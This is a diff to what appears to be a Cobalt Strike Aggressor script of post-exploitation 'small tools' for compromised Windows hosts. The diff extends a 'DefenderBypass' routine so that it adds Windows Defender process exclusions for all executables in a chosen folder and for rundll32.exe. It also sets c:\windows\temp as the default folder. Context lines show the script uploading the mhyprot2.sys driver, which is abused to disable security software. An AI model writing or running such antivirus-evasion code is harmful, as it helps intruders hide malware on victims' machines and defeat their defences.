@@ -1,5 +1,8 @@
 sub DefenderBypass{
     bshell($bid,"WMIC /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\'$3['path']\'");
+    bpowershell($bid, "Add-MpPreference -ExclusionProcess \"$3['path']\\*.exe\"");
+    bpowershell($bid, "Add-MpPreference -ExclusionProcess \"rundll32.exe\"");
+
 }
 sub MhyProtect{
     bupload($bid,script_resource("bin/mhyprot2.Sys"));
@@ -76,8 +79,8 @@ menu "小工具"{
         }
     item "Defender添加排除路径" {
         $bid = $1;
-        $dialog = dialog("DefenderBypass", %(path => "",bid => $bid), &DefenderBypass);
-        dialog_description($dialog, "Defender添加排除路径");
+        $dialog = dialog("DefenderBypass", %(path => "c:\\windows\\temp",bid => $bid), &DefenderBypass);
+        dialog_description($dialog, "Defender添加排除路径\n最后不要带\\");
         drow_text($dialog,"path","path:");
         dbutton_action($dialog, "Send");
         dialog_show($dialog);
